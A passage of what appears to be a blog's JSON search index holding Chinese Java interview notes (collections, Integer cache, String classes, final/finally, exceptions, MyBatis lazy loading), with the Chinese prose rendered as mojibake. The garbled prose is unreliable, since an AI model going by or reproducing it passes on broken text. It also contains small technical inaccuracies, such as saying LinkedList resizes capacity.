","slug":"Javaå­¦ä¹ ","permalink":"http://yoursite.com/tags/Java%E5%AD%A6%E4%B9%A0/"},{"name":"é¢è¯•é¢˜","slug":"é¢è¯•é¢˜","permalink":"http://yoursite.com/tags/%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"name":"hashmap","slug":"hashmap","permalink":"http://yoursite.com/tags/hashmap/"}]},{"title":"å¯¹æ¯”Vectorã€ArrayListã€LinkedListæœ‰ä½•åŒºåˆ«","slug":"å¯¹æ¯”Vectorã€ArrayListã€LinkedListæœ‰ä½•åŒºåˆ«","date":"2018-07-17T08:24:27.000Z","updated":"2020-11-14T17:11:18.558Z","comments":true,"path":"2018/07/17/å¯¹æ¯”Vectorã€ArrayListã€LinkedListæœ‰ä½•åŒºåˆ«/","link":"","permalink":"http://yoursite.com/2018/07/17/%E5%AF%B9%E6%AF%94Vector%E3%80%81ArrayList%E3%80%81LinkedList%E6%9C%89%E4%BD%95%E5%8C%BA%E5%88%AB/","excerpt":"","text":"è¿™ä¸‰è€…éƒ½æ˜¯å®ç°é›†åˆæ¡†æ¶çš„Listï¼Œä¹Ÿå°±æ˜¯æ‰€è°“çš„æœ‰åºé›†åˆï¼Œå› æ­¤å…·ä½“åŠŸèƒ½éƒ½å®ç°äº†æŒ‰ç…§ä½ç½®è¿›è¡Œå®šä½ï¼Œä¿®æ”¹ï¼Œæ·»åŠ æˆ–è€…åˆ é™¤ï¼Œéƒ½æä¾›äº†è¿­ä»£å™¨ä»¥éå†å…¶å†…å®¹ï¼Œä½†å› ä¸ºå…·ä½“è®¾è®¡ä¸åŒï¼Œåœ¨è¡Œä¸ºï¼Œæ€§èƒ½ï¼Œçº¿ç¨‹å®‰å…¨ç­‰æ–¹é¢ï¼Œè¡¨ç°åˆæœ‰å¾ˆå¤§ä¸åŒã€‚Vectoræ˜¯javaæ—©æœŸæä¾›çš„çº¿ç¨‹å®‰å…¨çš„åŠ¨æ€æ•°ç»„ï¼Œä½†æ•°æ®æ»¡æ—¶ï¼Œè‡ªåŠ¨æ‰©å®¹ï¼Œä¼šåˆ›å»ºæ–°çš„æ•°ç»„ï¼Œå¹¶æ‹·è´åŸæœ‰çš„æ•°ç»„ã€‚ArrayListæ˜¯åº”ç”¨æ›´å¹¿æ³›çš„åŠ¨æ€æ•°ç»„ï¼Œå®ƒæœ¬èº«æ˜¯çº¿ç¨‹ä¸å®‰å…¨çš„ï¼Œæ‰€ä»¥æ€§èƒ½ä¼šå¥½å¾ˆå¤šï¼Œæ‰©å®¹æ—¶ï¼Œå’Œvectorä¸ä¸€æ ·ï¼Œvectoræ˜¯æ‰©å¤§ä¸€å€ï¼Œè€ŒArrayListæ˜¯å¢åŠ 50%ã€‚LinkedListæ˜¯javaæä¾›çš„åŒå‘é“¾è¡¨ï¼Œå®ƒä¸æ˜¯çº¿ç¨‹å®‰å…¨çš„ï¼Œä¹Ÿéœ€è¦å‘ä¸Šé¢ä¸¤ç§è°ƒæ•´å®¹é‡ã€‚ çŸ¥è¯†æ‰©å±• 1.Vectorå’ŒArrayListä½œä¸ºåŠ¨æ€æ•°ç»„ï¼Œå®ƒå†…éƒ¨æ˜¯æ•°ç»„å®ç°çš„ï¼Œååˆ†ä¾¿äºéšæœºè®¿é—®ï¼Œé™¤äº†å°¾éƒ¨æ’å…¥æ•°æ®ï¼Œæˆ–è€…åˆ é™¤æ•°æ®æ—¶ï¼Œæ€§èƒ½æ˜¯ç›¸å¯¹è¾ƒå·®çš„ã€‚æ¯”å¦‚æˆ‘ä»¬åœ¨ä¸­éƒ¨æ’å…¥æ•°æ®ï¼Œéœ€è¦åç§»æ‰€æœ‰æ•°æ®ã€‚2.LinkedListè¿›è¡Œç»“ç‚¹æ’å…¥åˆ é™¤å¾ˆé«˜æ•ˆï¼Œä½†æ˜¯éšæœºè®¿é—®æ¯”åŠ¨æ€æ•°æ®æ…¢å¾ˆå¤šã€‚ æºç  Vector //Vector protected Object[] elementData; //åŠ¨æ€æ•°ç»„ public Vector(int initialCapacity) { this(initialCapacity, 0); } /** * Constructs an empty vector so that its internal data array * has size {@code 10} and its standard capacity increment is * zero. */ public Vector() { this(10); } //åˆå§‹åŒ–åŠ¨æ€æ•°ç»„é»˜è®¤å¤§å°ä¸º10 public synchronized boolean add(E e) { modCount++; ensureCapacityHelper(elementCount + 1); elementData[elementCount++] = e; return true; } private void ensureCapacityHelper(int minCapacity) { // overflow-conscious code if (minCapacity - elementData.length &gt; 0) grow(minCapacity); } private void grow(int minCapacity) { // overflow-conscious code int oldCapacity = elementData.length; int newCapacity = oldCapacity + ((capacityIncrement &gt; 0) ? capacityIncrement : oldCapacity); if (newCapacity - minCapacity &lt; 0) newCapacity = minCapacity; if (newCapacity - MAX_ARRAY_SIZE &gt; 0) newCapacity = hugeCapacity(minCapacity); elementData = Arrays.copyOf(elementData, newCapacity); } //è¿™è¾¹å¯ä»¥çœ‹å‡ºï¼Œæ‰©å®¹æ—¶ï¼Œæ˜¯æ‰©å¤§ä¸€å€ã€‚ int newCapacity = oldCapacity + ((capacityIncrement &gt; 0) ?capacityIncrement : oldCapacity); public synchronized int indexOf(Object o, int index) { if (o == null) { for (int i = index ; i &lt; elementCount ; i++) if (elementData[i]==null) return i; } else { for (int i = index ; i &lt; elementCount ; i++) if (o.equals(elementData[i])) return i; } return -1; } //å®šä½æ—¶ä¼šå¯¹objectè¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœæ˜¯nullï¼Œç”¨==åˆ¤æ–­ï¼Œå¦‚æœä¸æ˜¯nullï¼Œç”¨equals public synchronized Iterator&lt;E&gt; iterator() { return new Itr(); } /** * An optimized version of AbstractList.Itr */ private class Itr implements Iterator&lt;E&gt; { int cursor; // index of next element to return int lastRet = -1; // index of last element returned; -1 if no such int expectedModCount = modCount; public boolean hasNext() { // Racy but within spec, since modifications are checked // within or after synchronization in next/previous return cursor != elementCount; } public E next() { synchronized (Vector.this) { checkForComodification(); int i = cursor; if (i &gt;= elementCount) throw new NoSuchElementException(); cursor = i + 1; return elementData(lastRet = i); } } } //å¯¹vectorè¿›è¡Œéå†ä¹Ÿå°±æ–¹ä¾¿äº† Iterator&lt;String&gt; it = vector.iterator(); while(it.hasNext()){ System.out.println(it.next()); }ArrayList transient Object[] elementData; //åŠ¨æ€æ•°ç»„ private void grow(int minCapacity) { // overflow-conscious code int oldCapacity = elementData.length; int newCapacity = oldCapacity + (oldCapacity &gt;&gt; 1); if (newCapacity - minCapacity &lt; 0) newCapacity = minCapacity; if (newCapacity - MAX_ARRAY_SIZE &gt; 0) newCapacity = hugeCapacity(minCapacity); // minCapacity is usually close to size, so this is a win: elementData = Arrays.copyOf(elementData, newCapacity); } //æ‰©å®¹æ—¶ï¼Œæ˜¯&gt;&gt;1,ä¹Ÿå°±æ˜¯/2ã€‚æ‰€ä»¥ï¼Œå°±æ˜¯æ‰©å®¹50%ã€‚ public boolean add(E e) { ensureCapacityInternal(size + 1); // Increments modCount!! elementData[size++] = e; return true; } //çº¿ç¨‹ä¸å®‰å…¨LinkedList transient int size = 0; /** * Pointer to first node. * Invariant: (first == null &amp;&amp; last == null) || * (first.prev == null &amp;&amp; first.item != null) */ transient Node&lt;E&gt; first; /** * Pointer to last node. * Invariant: (first == null &amp;&amp; last == null) || * (last.next == null &amp;&amp; last.item != null) */ transient Node&lt;E&gt; last; //ä¸¤ä¸ªé“¾è¡¨ public boolean add(E e) { linkLast(e); return true; } void linkLast(E e) { final Node&lt;E&gt; l = last; final Node&lt;E&gt; newNode = new Node&lt;&gt;(l, e, null); last = newNode; if (l == null) first = newNode; else l.next = newNode; size++; modCount++; } //å½“ç„¶è¿˜æœ‰popï¼Œpushæ–¹æ³•ï¼ŒlinkedListä¸ä»…ä»…ç»§æ‰¿äº†AbstractListè€Œä¸”ç»§æ‰¿äº†Dequeï¼Œå¯ä»¥å®ç°åŒå‘é˜Ÿåˆ—ä½¿ç”¨","categories":[],"tags":[{"name":"Javaå­¦ä¹ ","slug":"Javaå­¦ä¹ ","permalink":"http://yoursite.com/tags/Java%E5%AD%A6%E4%B9%A0/"},{"name":"é¢è¯•é¢˜","slug":"é¢è¯•é¢˜","permalink":"http://yoursite.com/tags/%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"name":"é¢è¯•","slug":"é¢è¯•","permalink":"http://yoursite.com/tags/%E9%9D%A2%E8%AF%95/"}]},{"title":"int å’Œ Integer æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿè°ˆè°ˆ Integerç¼“å­˜å€¼çš„èŒƒå›´","slug":"int å’Œ Integer æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿè°ˆè°ˆ Integerç¼“å­˜å€¼çš„èŒƒå›´","date":"2018-07-17T06:52:32.000Z","updated":"2020-11-14T17:11:19.040Z","comments":true,"path":"2018/07/17/int å’Œ Integer æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿè°ˆè°ˆ Integerç¼“å­˜å€¼çš„èŒƒå›´/","link":"","permalink":"http://yoursite.com/2018/07/17/int%20%E5%92%8C%20Integer%20%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB%EF%BC%9F%E8%B0%88%E8%B0%88%20Integer%E7%BC%93%E5%AD%98%E5%80%BC%E7%9A%84%E8%8C%83%E5%9B%B4/","excerpt":"","text":"é¦–å…ˆintæ˜¯åŸå§‹æ•°æ®ç±»å‹ï¼Œåœ¨javaä¸­æœ‰8ä¸ªè¿™æ ·çš„åŸå§‹æ•°æ®ç±»å‹ï¼Œåˆ†åˆ«ä¸ºï¼šintï¼Œshortï¼Œbooleanï¼Œbyteï¼Œcharï¼Œfloatï¼Œdoubleï¼Œlongã€‚javaå½“ä¸­ä¸€åˆ‡çš†æ˜¯å¯¹è±¡ï¼Œä½†åŸºæœ¬æ•°æ®ç±»å‹é™¤å¤–ã€‚Integeræ˜¯intçš„åŒ…è£…ï¼Œå®ƒæœ‰ä¸€ä¸ªintç±»å‹çš„å­—æ®µå­˜å‚¨æ•°æ®ï¼Œå¹¶ä¸”æä¾›äº†åŸºæœ¬æ“ä½œï¼Œæ¯”å¦‚æ•°å­¦è¿ç®—ï¼Œä½è¿ç®—ç­‰ã€‚åœ¨java5ä¸­å¼•å…¥äº†è‡ªåŠ¨è£…ç®±ï¼Œè‡ªåŠ¨æ‹†ç®±çš„åŠŸèƒ½ï¼Œæå¤§ç®€åŒ–äº†ç›¸å…³ç¼–ç¨‹ã€‚Integerç¼“å­˜å€¼ï¼Œè¿™ä¸ªé—®é¢˜ï¼Œåœ¨å¹¿å®è·µä¸­ï¼Œå¤§é‡çš„æ•°æ®æ“ä½œä¸­ï¼Œéƒ½æ˜¯é›†ä¸­åœ¨æœ‰é™ï¼Œè¾ƒå°çš„æ•°æ®èŒƒå›´å†…ï¼Œåœ¨java5ä¸­æ–°å¢äº†é™æ€å·¥å‚æ–¹æ³•valueOfï¼ˆï¼‰ï¼Œåœ¨è°ƒç”¨å®ƒçš„æ—¶å€™ï¼Œä¼šè¿ç”¨åˆ°ç¼“å­˜æœºåˆ¶ï¼Œå¸¦æ¥æ˜æ˜¾çš„æ€§èƒ½æå‡ã€‚æŒ‰ç…§javadocï¼Œè¿™ä¸ªå€¼é»˜è®¤ ç¼“å­˜èŒƒå›´æ˜¯-128~127. çŸ¥è¯†ç‚¹æ‰©å±•1.è‡ªåŠ¨è£…ç®±ï¼Œå’Œè‡ªåŠ¨æ‹†ç®±è‡ªåŠ¨è£…ç®±å…¶å®æ˜¯ä¸€ç§è¯­æ³•ç³–ï¼Œå¯ä»¥ç®€å•ç†è§£ä¸ºjavaå¹³å°ä¸ºæˆ‘ä»¬è‡ªåŠ¨è¿›è¡Œä¸€äº›è½¬åŒ–ï¼Œä¿è¯ä¸åŒå†™æ³•åœ¨è¿è¡Œæ—¶ç­‰ä»·ï¼Œä»–ä»¬å‘ç”Ÿåœ¨ ç¼–è¯‘é˜¶æ®µï¼Œä¹Ÿå°±æ˜¯ç”Ÿæˆçš„å­—èŠ‚ç æ˜¯ç›¸åŒçš„ã€‚ Integer integer = 1; int unboxing = integer ++;åç¼–è¯‘è¾“å‡º 1: invokestatic #2 java/lang/Integer.valueOf:(I)Ljava/lang/Integer; 8: invokevirtual #3 java/lang/Integer.intValue:()Iè¿™ç§ç¼“å­˜æœºåˆ¶ä¸æ˜¯åªæœ‰Integerå®ç°äº†ï¼ŒåŒæ ·å­˜åœ¨äºå…¶ä»–çš„åŒ…è£…ç±»ä¸­ã€‚å¦‚Boolean Boolean.TRUE,Boolean.Falseï¼ŒShort-128~127ï¼ŒByte å…¨éƒ¨ç¼“å­˜ï¼ŒCharacter ç¼“å­˜èŒƒå›´ â€˜\\u0000â€™ åˆ° â€˜\\u007Fâ€™ã€‚åŸåˆ™ä¸Šå»ºè®®é¿å…è‡ªåŠ¨è£…ç®±ï¼Œæ‹†ç®±è¡Œä¸ºï¼Œå°¤å…¶æ˜¯åœ¨æ€§èƒ½æ•æ„Ÿã€‚ public static Integer valueOf(String s, int radix) throws NumberFormatException { return Integer.valueOf(parseInt(s,radix)); } public static Integer valueOf(String s) throws NumberFormatException { return Integer.valueOf(parseInt(s, 10)); } //ä»¥ä¸Šæ˜¯valueof public static Integer valueOf(int i) { if (i &gt;= IntegerCache.low &amp;&amp; i &lt;= IntegerCache.high) return IntegerCache.cache[i + (-IntegerCache.low)]; return new Integer(i); } private static class IntegerCache { static final int low = -128; static final int high; static final Integer cache[]; static { // high value may be configured by property int h = 127; String integerCacheHighPropValue = sun.misc.VM.getSavedProperty(&quot;java.lang.Integer.IntegerCache.high&quot;); if (integerCacheHighPropValue != null) { try { int i = parseInt(integerCacheHighPropValue); i = Math.max(i, 127); // Maximum array size is Integer.MAX_VALUE h = Math.min(i, Integer.MAX_VALUE - (-low) -1); } catch( NumberFormatException nfe) { // If the property cannot be parsed into an int, ignore it. } } high = h; cache = new Integer[(high - low) + 1]; int j = low; for(int k = 0; k &lt; cache.length; k++) cache[k] = new Integer(j++); // range [-128, 127] must be interned (JLS7 5.1.7) assert IntegerCache.high &gt;= 127; } private IntegerCache() {} }ä»ä¸Šé¢æˆ‘ä»¬å¯ä»¥çœ‹å‡ºï¼Œåœ¨åˆ›å»ºIntegerå¯¹è±¡æ—¶ï¼Œä¼šè°ƒç”¨public static Integer valueOf(int i)ï¼Œå…¶ä¸­å°±ä¼šåˆ¤æ–­è¯¥æ•°å€¼æ˜¯å¦æ˜¯åœ¨ç¼“å­˜å€¼èŒƒå›´å†…ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¿”å›ä¸€ä¸ªå·²ç»åˆ›å»ºå¥½çš„Intgerå¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯åœ¨IntegerCacheä¸­åˆ›å»ºçš„Integerç¼“å­˜æ•°ç»„ï¼Œå¦‚æœä¸åœ¨è¿™ä¸ªèŒƒå›´å†…ï¼Œå°±ç›´æ¥newä¸€ä¸ªIntegerã€‚å½“ç„¶ï¼Œè¿™ä¸ªç¼“å­˜å€¼é»˜è®¤æ˜¯-128~127 ï¼Œä½†æ˜¯æ˜¯å¯ä»¥ä¿®æ”¹çš„ï¼Œåœ¨vmä¸­ä¿®æ”¹å³å¯è°ƒæ•´ç¼“å­˜å¤§å°ã€‚","categories":[],"tags":[{"name":"Javaå­¦ä¹ ","slug":"Javaå­¦ä¹ ","permalink":"http://yoursite.com/tags/Java%E5%AD%A6%E4%B9%A0/"},{"name":"é¢è¯•é¢˜","slug":"é¢è¯•é¢˜","permalink":"http://yoursite.com/tags/%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"name":"é¢è¯•","slug":"é¢è¯•","permalink":"http://yoursite.com/tags/%E9%9D%A2%E8%AF%95/"}]},{"title":"stringï¼ŒstringBufferï¼ŒstringBuilderåŒºåˆ«","slug":"stringï¼ŒstringBufferï¼ŒstringBuilderåŒºåˆ«","date":"2018-07-12T11:08:48.000Z","updated":"2020-11-14T17:11:19.639Z","comments":true,"path":"2018/07/12/stringï¼ŒstringBufferï¼ŒstringBuilderåŒºåˆ«/","link":"","permalink":"http://yoursite.com/2018/07/12/string%EF%BC%8CstringBuffer%EF%BC%8CstringBuilder%E5%8C%BA%E5%88%AB/","excerpt":"","text":"string public final class String implements java.io.Serializable, Comparable&lt;String&gt;, CharSequence { /** The value is used for character storage. */ private final char value[];ä»è¿™é‡Œå¯ä»¥çœ‹å‡ºï¼Œstringæ˜¯æ˜æ˜¾çš„immutableç±»ï¼Œè¢«ä¿®é¥°ä¸ºfinalclassï¼Œè€Œä¸”æ–¹æ³•éƒ½è¢«finalä¿®é¥°ï¼Œæ‰€ä»¥æ‹¼æ¥ï¼Œå‰ªè£ç­‰æ–¹æ³•éƒ½newæ–°çš„stringã€‚ä¸ºäº†é¿å…å¤§é‡çš„stringè¢«åˆ›å»ºï¼Œå…¶è¿è¡Œæœºåˆ¶æ˜¯ï¼šåˆ›å»ºä¸€ä¸ªå­—ç¬¦ä¸²æ—¶ï¼Œé¦–å…ˆæ£€æŸ¥æ± ä¸­æ˜¯å¦æœ‰å€¼ç›¸åŒçš„å­—ç¬¦ä¸²å¯¹è±¡ï¼Œå¦‚æœæœ‰åˆ™ä¸éœ€è¦åˆ›å»ºç›´æ¥ä»æ± ä¸­åˆšæŸ¥æ‰¾åˆ°çš„å¯¹è±¡å¼•ç”¨ï¼›å¦‚æœæ²¡æœ‰åˆ™æ–°å»ºå­—ç¬¦ä¸²å¯¹è±¡ï¼Œè¿”å›å¯¹è±¡å¼•ç”¨ï¼Œå¹¶ä¸”å°†æ–°åˆ›å»ºçš„å¯¹è±¡æ”¾å…¥æ± ä¸­ã€‚ä½†æ˜¯ï¼Œé€šè¿‡newæ–¹æ³•åˆ›å»ºçš„Stringå¯¹è±¡æ˜¯ä¸æ£€æŸ¥å­—ç¬¦ä¸²æ± çš„ï¼Œè€Œæ˜¯ç›´æ¥åœ¨å †åŒºæˆ–æ ˆåŒºåˆ›å»ºä¸€ä¸ªæ–°çš„å¯¹è±¡ï¼Œä¹Ÿä¸ä¼šæŠŠå¯¹è±¡æ”¾å…¥æ± ä¸­ã€‚ä¸Šè¿°åŸåˆ™åªé€‚ç”¨äºé€šè¿‡ç›´æ¥é‡ç»™Stringå¯¹è±¡å¼•ç”¨èµ‹å€¼çš„æƒ…å†µã€‚ ä¸¾ä¾‹ï¼šString str1 = â€œ123â€; //é€šè¿‡ç›´æ¥é‡èµ‹å€¼æ–¹å¼ï¼Œæ”¾å…¥å­—ç¬¦ä¸²å¸¸é‡æ± String str2 = new String(â€œ123â€);//é€šè¿‡newæ–¹å¼èµ‹å€¼æ–¹å¼ï¼Œä¸æ”¾å…¥å­—ç¬¦ä¸²å¸¸é‡æ±  æ³¨æ„ï¼šStringæä¾›äº†intern()æ–¹æ³•ã€‚è°ƒç”¨è¯¥æ–¹æ³•æ—¶ï¼Œå¦‚æœå¸¸é‡æ± ä¸­åŒ…æ‹¬äº†ä¸€ä¸ªç­‰äºæ­¤Stringå¯¹è±¡çš„å­—ç¬¦ä¸²ï¼ˆç”±equalsæ–¹æ³•ç¡®å®šï¼‰ï¼Œåˆ™è¿”å›æ± ä¸­çš„å­—ç¬¦ä¸²ã€‚å¦åˆ™ï¼Œå°†æ­¤Stringå¯¹è±¡æ·»åŠ åˆ°æ± ä¸­ï¼Œå¹¶ä¸”è¿”å›æ­¤æ± ä¸­å¯¹è±¡çš„å¼•ç”¨ã€‚ 2.stringBuffer3.stringBuilderstringBufferå’ŒstringBuilderéƒ½ç»§æ‰¿äº†AbstractStringBuilderï¼Œæä¾›äº†å‡ ä¹ä¸€æ ·æ–¹æ³•ã€‚ abstract class AbstractStringBuilder implements Appendable, CharSequence { /** * The value is used for character storage. */ char[] value;å¯ä»¥çœ‹å‡ºè¿™ä¸ªåœ°æ–¹ï¼Œä¸æ˜¯ç”¨finalä¿®é¥°çš„ï¼Œæ‰€ä»¥æ·»åŠ ï¼Œç­‰æ–¹æ³•æ—¶ä¸ä¼šnew å¯¹è±¡ã€‚ ä½†æ˜¯ï¼ŒstringBufferå’ŒStringBuilderæ˜¯æœ‰ä¸åŒçš„ï¼ŒStringBufferæ‰€æœ‰æ–¹æ³•éƒ½æ˜¯è¢«synchronizedä¿®é¥°çš„ @Override public synchronized int length() { return count; } @Override public synchronized int capacity() { return value.length; } @Override public synchronized void ensureCapacity(int minimumCapacity) { super.ensureCapacity(minimumCapacity); }ä¹Ÿå°±æ˜¯è¯´stringBufferæ˜¯çº¿ç¨‹å®‰å…¨çš„ï¼Œä½†å®‰å…¨çš„ä»£ä»·æ˜¯ï¼Œæ€§èƒ½çš„é™ä½ã€‚","categories":[],"tags":[{"name":"é¢è¯•é¢˜","slug":"é¢è¯•é¢˜","permalink":"http://yoursite.com/tags/%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"name":"javaé¢è¯•","slug":"javaé¢è¯•","permalink":"http://yoursite.com/tags/java%E9%9D%A2%E8%AF%95/"}]},{"title":"finalå’Œfinallyå’Œfinalizeä¹‹é—´åŒºåˆ«","slug":"finalå’Œfinallyå’Œfinalizeä¹‹é—´åŒºåˆ«","date":"2018-07-10T10:35:56.000Z","updated":"2020-11-14T17:11:20.126Z","comments":true,"path":"2018/07/10/finalå’Œfinallyå’Œfinalizeä¹‹é—´åŒºåˆ«/","link":"","permalink":"http://yoursite.com/2018/07/10/final%E5%92%8Cfinally%E5%92%8Cfinalize%E4%B9%8B%E9%97%B4%E5%8C%BA%E5%88%AB/","excerpt":"","text":"finalï¼šå¯ä»¥ç”¨æ¥ä¿®é¥°ç±»ï¼Œå˜é‡ï¼Œæ–¹æ³•finalç±»ï¼šä¸å¯ç»§æ‰¿æ‰©å±•finalå˜é‡ï¼šä¸å¯æ›´æ”¹finalæ–¹æ³•ï¼šä¸å¯override finallyï¼šæ˜¯javaä¸­ä¿è¯é‡ç‚¹ä»£ç ä¸€å®šè¢«æ‰§è¡Œçš„æœºåˆ¶ï¼Œæœ‰try-catch-finallyå’Œtry-finallyæ¥å…³é—­jdbcè¿æ¥ï¼Œä¿è¯unlockç­‰åŠ¨ä½œ try { // do something System.exit(1); } finally{ System.out.println(â€œPrint from finallyâ€); }ä½†æ˜¯ä¸Šé¢è¿™ä¸ªä»£ç æ˜¯ä¸æ‰§è¡Œçš„ï¼Œfinallyå› ä¸ºåœ¨å‰é¢ï¼Œè°ƒç”¨äº†system.exit(1);å°†ç¨‹åºé€€å‡ºäº†ï¼Œfinallyæ— æ³•æ‰§è¡Œ finalizeæ˜¯java.lang.Objectä¸­çš„ä¸€ä¸ªæ–¹æ³•ï¼Œå®ƒæ˜¯åœ¨åƒåœ¾å›æ”¶å‰ï¼Œæå‰å¯¹ç‰¹å®šå¯¹è±¡è¿›è¡Œå›æ”¶ï¼Œä½†æ˜¯ç°åœ¨å·²ç»ä¸æ¨èä½¿ç”¨äº†ã€‚","categories":[],"tags":[{"name":"é¢è¯•é¢˜","slug":"é¢è¯•é¢˜","permalink":"http://yoursite.com/tags/%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"name":"javaå¤ä¹ ","slug":"javaå¤ä¹ ","permalink":"http://yoursite.com/tags/java%E5%A4%8D%E4%B9%A0/"},{"name":"javaæ ¸å¿ƒæŠ€æœ¯","slug":"javaæ ¸å¿ƒæŠ€æœ¯","permalink":"http://yoursite.com/tags/java%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/"}]},{"title":"exceptionå’ŒerroråŒºåˆ«","slug":"exceptionå’ŒerroråŒºåˆ«","date":"2018-07-10T10:06:41.000Z","updated":"2020-11-14T17:11:20.613Z","comments":true,"path":"2018/07/10/exceptionå’ŒerroråŒºåˆ«/","link":"","permalink":"http://yoursite.com/2018/07/10/exception%E5%92%8Cerror%E5%8C%BA%E5%88%AB/","excerpt":"","text":"exceptionå’Œerroréƒ½æ˜¯ç»§æ‰¿throwableç±»ï¼Œåœ¨javaä¸­åªæœ‰throwableç±»å‹å¯ä»¥è¢«throwæˆ–è€…è¢«catchï¼Œå®ƒæ˜¯å¼‚å¸¸å¤„ç†æœºåˆ¶çš„åŸºæœ¬ç»„æˆç±»å‹erroræ˜¯æŒ‡æ­£å¸¸æƒ…å†µä¸‹ï¼Œä¸å¤§å¯èƒ½å‡ºç°çš„ï¼Œç»å¤§å¤šæ•°erroréƒ½ä¼šå¯¼è‡´ç¨‹åºï¼ˆæ¯”å¦‚jvmè‡ªèº«ï¼‰å¤„äºéæ­£å¸¸æˆ–è€…ä¸å¯æ¢å¤çš„çŠ¶æ€ã€‚æ¯”å¦‚è¯´OutOfmemoryErrorexceptionåˆ†ä¸ºå¯æ£€æŸ¥ï¼ˆcheckedï¼‰å’Œä¸å¯æ£€æŸ¥ï¼ˆuncheckedï¼‰checkedåœ¨ç¨‹åºä¸­å¿…é¡»è¿›è¡Œæ•è·å¤„ç†ï¼Œè­¬å¦‚IOExceptionuncheckedæ˜¯è¿è¡Œæ—¶å¼‚å¸¸ï¼Œè­¬å¦‚è¯´RuntimeExceptionå’ŒNullPointerException","categories":[],"tags":[{"name":"é¢è¯•é¢˜","slug":"é¢è¯•é¢˜","permalink":"http://yoursite.com/tags/%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"name":"javaå¤ä¹ ","slug":"javaå¤ä¹ ","permalink":"http://yoursite.com/tags/java%E5%A4%8D%E4%B9%A0/"},{"name":"javaæ ¸å¿ƒæŠ€æœ¯","slug":"javaæ ¸å¿ƒæŠ€æœ¯","permalink":"http://yoursite.com/tags/java%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/"}]},{"title":"java.lang.ClassNotFoundException_ org.apache.jsp.WEB_002dINF.jsp.login_jsp","slug":"java.lang.ClassNotFoundException_ org.apache.jsp.WEB_002dINF.jsp.login_jsp","date":"2018-06-20T08:44:36.000Z","updated":"2020-11-14T17:11:21.089Z","comments":true,"path":"2018/06/20/java.lang.ClassNotFoundException_ org.apache.jsp.WEB_002dINF.jsp.login_jsp/","link":"","permalink":"http://yoursite.com/2018/06/20/java.lang.ClassNotFoundException_%20org.apache.jsp.WEB_002dINF.jsp.login_jsp/","excerpt":"","text":"springboot é¡¹ç›®ä¸­ï¼Œå‡ºç°è¿™ä¸ªé”™è¯¯ï¼ŒæŸ¥çœ‹æ˜¯å¦pom.xmlé‡Œé¢çš„denpendencyæ˜¯å¦éƒ½å·²ç»ä¸‹è½½æˆåŠŸï¼Œå¦‚æœä¸æ˜¯ï¼Œä½ çœ‹çœ‹åˆ«äººçš„åšå®¢","categories":[],"tags":[{"name":"springboot","slug":"springboot","permalink":"http://yoursite.com/tags/springboot/"}]},{"title":"mybatis lazyload","slug":"mybatis lazyload","date":"2018-06-15T02:16:12.000Z","updated":"2020-11-14T17:11:21.624Z","comments":true,"path":"2018/06/15/mybatis lazyload/","link":"","permalink":"http://yoursite.com/2018/06/15/mybatis%20lazyload/","excerpt":"","text":"é¦–å…ˆpojoç±»dept.java package com.husky.pojo; import java.util.List; public class Dept { private int id; private String name; private List&lt;Emp&gt; emps; public int getId() { return id; } public void setId(int id) { this.id = id; } public String getName() { return name; } public void setName(String name) { this.name = name; } public List&lt;Emp&gt; getEmps() { return emps; } public void setEmp(List&lt;Emp&gt; emps) { this.emps = emps; } @Override public String toString() { return &quot;Dept{&quot; + &quot;id=&quot; + id + &quot;, name=&apos;&quot; + name + &apos;\\&apos;&apos; + &quot;, emps=&quot; + emps + &apos;}&apos;; } }emp.java package com.husky.pojo; public class Emp { private int id; private String firstName; private double salary; private Emp manager; public int getId() { return id; } public void setId(int id) { this.id = id; } public String getFirstName() { return firstName; } public void setFirstName(String firstName) { this.firstName = firstName; } public double getSalary() { return salary; } public void setSalary(double salary) { this.salary = salary; } public Emp getManager() { return manager; } public void setManager(Emp manager) { this.manager = manager; } @Override public String toString() { return &quot;Emp{&quot; + &quot;id=&quot; + id + &quot;, firstName=&apos;&quot; + firstName + &apos;\\&apos;&apos; + &quot;, salary=&quot; + salary + &quot;, manager=&quot; + manager + &apos;}&apos;; } }ä¸‹é¢æ˜¯EmpMapper.xml &lt;!--namespace=&quot;emp&quot;--&gt; &lt;select id=&quot;findByDept&quot; parameterType=&quot;int&quot; resultType=&quot;com.husky.pojo.Emp&quot;&gt; select id,first_name name,salary from s_emp where dept_id = #{id} &lt;/select&gt;DeptMapper.xml &lt;!--lazy load--&gt; &lt;resultMap id=&quot;lazyDept&quot; type=&quot;com.husky.pojo.Dept&quot;&gt; &lt;id column=&quot;id&quot; property=&quot;id&quot;/&gt; &lt;!-- å¯¹deptä¸­çš„empä¿¡æ¯å»¶è¿ŸåŠ è½½ åœ¨collectionä¸­çš„ select :è¡¨ç¤ºå…³è”çš„æŸ¥è¯¢ï¼Œæ­¤å¤„å¦‚æœçš„findByDeptä¸æ˜¯DeptMapper.xmlä¸­ï¼Œåˆ™è¦åŠ å¦ä¸€ä¸ªmapperçš„namespaceï¼Œå¦‚emp.findByDept column:æ˜¯å¦å¤–ä¸€ä¸ªæŸ¥è¯¢æ‰€éœ€è¦çš„å‚æ•° --&gt; &lt;collection property=&quot;emps&quot; ofType=&quot;com.husky.pojo.Emp&quot; select=&quot;emp.findByDept&quot; column=&quot;id&quot;&gt;&lt;/collection&gt; &lt;/resultMap&gt; &lt;select id=&quot;findDeptById&quot; parameterType=&quot;int&quot; resultMap=&quot;lazyDept&quot;&gt; select id,name from s_dept where id = #{id} &lt;/select&gt;å½“ç„¶è¦å¼€å¯æ‡’åŠ è½½è¦åœ¨mybatis é…ç½®æ–‡ä»¶ä¸­åŠ ä¸Šlazyloadçš„é…ç½®sqlMapConfig.xml &lt;settings&gt; &lt;!-- Globally enables or disables any caches configured in any mapper under this 